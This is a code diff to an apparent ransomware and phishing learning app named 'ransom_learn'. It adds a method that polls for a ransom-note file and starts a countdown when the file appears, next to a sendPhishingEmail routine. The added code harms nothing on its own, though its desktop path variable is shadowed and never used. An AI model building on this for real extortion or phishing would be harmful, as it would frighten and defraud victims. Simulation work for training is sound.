@@ -3,6 +3,7 @@ import 'dart:async';
 import 'package:http/http.dart' as http;
 import 'package:ransom_learn/file_manager.dart';
 import 'dart:convert';
+import 'dart:io';
 
 
 
@@ -267,6 +268,26 @@ class EmailPage extends StatefulWidget {
 class _EmailPageState extends State<EmailPage> {
   final TextEditingController _emailController = TextEditingController();
   bool _isSending = false;
+
+  void checkForRansomNote(Function startTimer) {
+  String ransomNotePath = "C:\\Users\\yohan\\OneDrive\\Desktop\\RansomLearn\\RansomNote.txt";
+
+  Timer.periodic(Duration(seconds: 5), (timer) {
+  String? desktopPath = getDesktopPath();
+  if (desktopPath != null) {
+    String ransomNotePath = "$desktopPath\\RansomLearn\\RansomNote.txt";
+    print("Ransom note path: $ransomNotePath");
+  } else {
+    print("Error: Desktop path not found!");
+  }
+
+    if (File(ransomNotePath).existsSync()) {
+      print("Ransom note detected. Starting countdown...");
+      startTimer(); // Call the function that starts the timer
+      timer.cancel(); // Stop checking after detecting the note
+    }
+  });
+}
 
   Future<void> sendPhishingEmail() async {
     if (_emailController.text.isEmpty) {
